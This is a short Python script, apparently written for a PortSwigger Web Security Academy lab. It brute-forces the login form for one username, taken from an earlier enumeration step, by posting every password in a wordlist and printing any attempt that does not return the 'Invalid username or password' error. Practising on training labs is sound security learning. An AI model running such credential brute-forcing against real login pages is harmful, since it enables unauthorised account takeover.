import requests as req 

url = "https://0a0100f1044d67dfc25a25b200750066.web-security-academy.net/login"
# Username discovered from the previous script
user = "americas"

pass_file = open("../passwords")

while password := pass_file.readline().strip():
    dat = {"username":user,"password":password}
    x = req.post(url, dat)
    if "Invalid username or password" not in x.text:
        print(f"Username: {user} Password: {password}")